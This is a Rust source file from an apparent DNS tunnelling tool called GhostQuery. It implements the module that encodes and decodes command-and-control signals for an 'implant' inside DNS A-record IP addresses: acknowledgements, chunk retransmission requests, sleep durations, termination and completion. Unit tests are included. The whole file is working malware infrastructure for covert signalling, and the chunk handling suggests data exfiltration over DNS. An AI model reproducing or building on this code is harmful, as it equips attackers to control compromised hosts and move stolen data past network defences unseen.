//! Command handling for control signaling.
//!
//! Commands are encoded in DNS responses (A record octets)
//! and control implant behavior.

use std::net::Ipv4Addr;

use crate::common::constants::{ACK_IP, COMMAND_IP_BASE, COMPLETE_IP, DIRTY_BIT_IP, ERROR_IP};
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{ChunkId, Command, ControlResponse};

/// Command handler for encoding/decoding control signals
#[derive(Debug, Clone)]
pub struct CommandHandler {
    /// Base IP for command encoding
    command_base: [u8; 3],
}

impl CommandHandler {
    /// Create a new command handler
    pub fn new() -> Self {
        Self {
            command_base: COMMAND_IP_BASE,
        }
    }

    /// Encode a command into an A record IP address
    pub fn encode_command(&self, command: Command) -> Ipv4Addr {
        Ipv4Addr::new(
            self.command_base[0],
            self.command_base[1],
            self.command_base[2],
            command.to_octet(),
        )
    }

    /// Encode a retransmit request with chunk ID
    pub fn encode_retransmit(&self, chunk_id: ChunkId) -> Ipv4Addr {
        // Use second octet for high byte, third for low byte of chunk ID
        let id = chunk_id.as_u32();
        let high = ((id >> 8) & 0xFF) as u8;
        let low = (id & 0xFF) as u8;

        Ipv4Addr::new(self.command_base[0], high, low, Command::Retransmit.to_octet())
    }

    /// Encode a sleep command with duration
    pub fn encode_sleep(&self, seconds: u8) -> Ipv4Addr {
        Ipv4Addr::new(
            self.command_base[0],
            0,
            seconds,
            Command::Sleep.to_octet(),
        )
    }

    /// Decode a command from an A record IP address
    pub fn decode_command(&self, ip: Ipv4Addr) -> Result<ControlResponse> {
        let octets = ip.octets();

        // Verify base
        if octets[0] != self.command_base[0] {
            return Err(GhostQueryError::InvalidCommand(octets[3]));
        }

        let command = Command::from_octet(octets[3])
            .ok_or(GhostQueryError::InvalidCommand(octets[3]))?;

        match command {
            Command::Ack => Ok(ControlResponse::ack()),
            Command::Retransmit => {
                // Extract chunk ID from octets 1 and 2
                let chunk_id = ((octets[1] as u32) << 8) | (octets[2] as u32);
                Ok(ControlResponse::retransmit(ChunkId::new(chunk_id)))
            }
            Command::Sleep => {
                let duration = octets[2] as u32;
                Ok(ControlResponse::sleep(duration))
            }
            Command::Terminate => Ok(ControlResponse::terminate()),
            Command::Complete => Ok(ControlResponse::complete()),
            _ => Ok(ControlResponse {
                command,
                chunk_id: None,
                parameter: None,
            }),
        }
    }

    /// Encode a control response to IP address
    pub fn encode_response(&self, response: &ControlResponse) -> Ipv4Addr {
        match response.command {
            Command::Ack => Ipv4Addr::from(ACK_IP),
            Command::Retransmit => {
                if let Some(chunk_id) = response.chunk_id {
                    self.encode_retransmit(chunk_id)
                } else {
                    Ipv4Addr::from(DIRTY_BIT_IP)
                }
            }
            Command::Sleep => {
                let secs = response.parameter.unwrap_or(30) as u8;
                self.encode_sleep(secs)
            }
            Command::Complete => Ipv4Addr::from(COMPLETE_IP),
            Command::Error => Ipv4Addr::from(ERROR_IP),
            _ => self.encode_command(response.command),
        }
    }

    /// Check if an IP is a special command IP
    pub fn is_command_ip(&self, ip: Ipv4Addr) -> bool {
        ip.octets()[0] == self.command_base[0]
    }

    /// Create standard responses
    pub fn ack_response(&self) -> Ipv4Addr {
        Ipv4Addr::from(ACK_IP)
    }

    pub fn dirty_response(&self) -> Ipv4Addr {
        Ipv4Addr::from(DIRTY_BIT_IP)
    }

    pub fn complete_response(&self) -> Ipv4Addr {
        Ipv4Addr::from(COMPLETE_IP)
    }

    pub fn error_response(&self) -> Ipv4Addr {
        Ipv4Addr::from(ERROR_IP)
    }
}

impl Default for CommandHandler {
    fn default() -> Self {
        Self::new()
    }
}

/// Builder for creating complex command sequences
pub struct CommandBuilder {
    commands: Vec<ControlResponse>,
}

impl CommandBuilder {
    pub fn new() -> Self {
        Self {
            commands: Vec::new(),
        }
    }

    pub fn ack(mut self) -> Self {
        self.commands.push(ControlResponse::ack());
        self
    }

    pub fn retransmit(mut self, chunk_id: ChunkId) -> Self {
        self.commands.push(ControlResponse::retransmit(chunk_id));
        self
    }

    pub fn sleep(mut self, duration: u32) -> Self {
        self.commands.push(ControlResponse::sleep(duration));
        self
    }

    pub fn terminate(mut self) -> Self {
        self.commands.push(ControlResponse::terminate());
        self
    }

    pub fn complete(mut self) -> Self {
        self.commands.push(ControlResponse::complete());
        self
    }

    pub fn build(self) -> Vec<ControlResponse> {
        self.commands
    }
}

impl Default for CommandBuilder {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encode_decode_command() {
        let handler = CommandHandler::new();

        // Test ACK
        let ip = handler.encode_command(Command::Ack);
        let response = handler.decode_command(ip).unwrap();
        assert_eq!(response.command, Command::Ack);

        // Test Complete
        let ip = handler.encode_command(Command::Complete);
        let response = handler.decode_command(ip).unwrap();
        assert_eq!(response.command, Command::Complete);
    }

    #[test]
    fn test_encode_retransmit() {
        let handler = CommandHandler::new();

        let chunk_id = ChunkId::new(256);
        let ip = handler.encode_retransmit(chunk_id);
        let response = handler.decode_command(ip).unwrap();

        assert_eq!(response.command, Command::Retransmit);
        assert_eq!(response.chunk_id, Some(chunk_id));
    }

    #[test]
    fn test_encode_sleep() {
        let handler = CommandHandler::new();

        let ip = handler.encode_sleep(60);
        let response = handler.decode_command(ip).unwrap();

        assert_eq!(response.command, Command::Sleep);
        assert_eq!(response.parameter, Some(60));
    }

    #[test]
    fn test_encode_response() {
        let handler = CommandHandler::new();

        let response = ControlResponse::retransmit(ChunkId::new(42));
        let ip = handler.encode_response(&response);
        let decoded = handler.decode_command(ip).unwrap();

        assert_eq!(decoded.command, Command::Retransmit);
        assert_eq!(decoded.chunk_id, Some(ChunkId::new(42)));
    }

    #[test]
    fn test_is_command_ip() {
        let handler = CommandHandler::new();

        assert!(handler.is_command_ip(Ipv4Addr::new(127, 0, 0, 1)));
        assert!(!handler.is_command_ip(Ipv4Addr::new(8, 8, 8, 8)));
    }

    #[test]
    fn test_command_builder() {
        let commands = CommandBuilder::new()
            .ack()
            .sleep(30)
            .retransmit(ChunkId::new(5))
            .build();

        assert_eq!(commands.len(), 3);
        assert_eq!(commands[0].command, Command::Ack);
        assert_eq!(commands[1].command, Command::Sleep);
        assert_eq!(commands[2].command, Command::Retransmit);
    }
}

